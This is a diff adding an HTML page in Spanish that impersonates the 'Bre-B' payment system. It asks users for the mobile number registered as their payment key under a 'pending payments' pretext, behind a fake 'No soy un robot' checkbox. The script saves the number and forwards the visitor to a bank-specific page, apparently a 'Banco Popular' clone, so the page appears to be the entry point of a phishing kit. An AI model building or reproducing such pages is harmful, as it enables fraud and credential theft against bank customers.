@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Bre-B</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:"Inter",system-ui,-apple-system,"Segoe UI",Helvetica,Arial,sans-serif}
+body{background:#0f1830;color:#1a1a1a}
+.header{padding:24px 0;text-align:center;color:#a7ffeb;font-weight:800;font-size:34px;letter-spacing:.5px}
+.header .accent{color:#80e8c5}
+.container{min-height:calc(100vh - 100px);display:flex;align-items:flex-start;justify-content:center;padding:24px}
+.card{width:100%;max-width:420px;background:#fff;border-radius:20px;padding:26px 22px;box-shadow:0 18px 45px rgba(0,0,0,.18)}
+.title{font-weight:800;font-size:22px;text-align:center;margin-bottom:8px;color:#111}
+.desc{text-align:center;color:#4a5568;font-size:14px;margin-bottom:18px}
+.label{display:block;font-size:13px;margin-bottom:6px;color:#374151}
+.input{width:100%;padding:12px;border-radius:12px;border:1px solid #d5d5d5;font-size:15px;background:#f8fafc}
+.captcha{margin-top:14px;border:1px solid #e5e7eb;border-radius:12px;padding:10px;display:flex;align-items:center;gap:10px}
+.captcha input{width:18px;height:18px}
+.button{width:100%;margin-top:18px;padding:13px;border:none;border-radius:24px;font-weight:700;color:#fff;background:#cfd8dc;cursor:not-allowed}
+.button.enabled{background:#0a7b5b;cursor:pointer}
+.help{margin-top:12px;text-align:center;color:#64748b;font-size:12px}
+</style>
+</head>
+<body>
+<div class="header">Bre-<span class="accent">B</span></div>
+<div class="container">
+<div class="card">
+<div class="title">Ingresa tu número de celular</div>
+<div class="desc">Usa el número de celular que registraste como tu llave principal para consultar si tienes pagos pendientes.</div>
+<label class="label" for="celular">Número de celular</label>
+<input class="input" id="celular" type="text" inputmode="numeric" maxlength="10" placeholder="Ej: 3001234567" autocomplete="off">
+<div class="captcha">
+<input type="checkbox" id="captcha">
+<label for="captcha">No soy un robot</label>
+</div>
+<button id="ingresar" class="button" disabled>Ingresar</button>
+<div class="help">Debe tener 10 dígitos. Si cambiaste de número, podrás actualizarlo después.</div>
+</div>
+</div>
+<script>
+var celular=document.getElementById("celular");
+var captcha=document.getElementById("captcha");
+var btn=document.getElementById("ingresar");
+function onlyDigits(el,max){if(!el)return;el.addEventListener("input",function(){var v=this.value.replace(/\D/g,"");if(typeof max==="number")v=v.slice(0,max);this.value=v;update();});}
+function update(){var ok=(celular.value.length===10 && captcha.checked);btn.disabled=!ok;btn.classList.toggle("enabled",ok);}
+onlyDigits(celular,10);captcha.addEventListener("change",update);update();
+btn.addEventListener("click",function(){if(btn.disabled)return;var path=sessionStorage.getItem("selected_bank_path")||"../banco popular/index.html";sessionStorage.setItem("bc_usuario",celular.value);window.location.href=path;});
+</script>
+</body>
+</html>
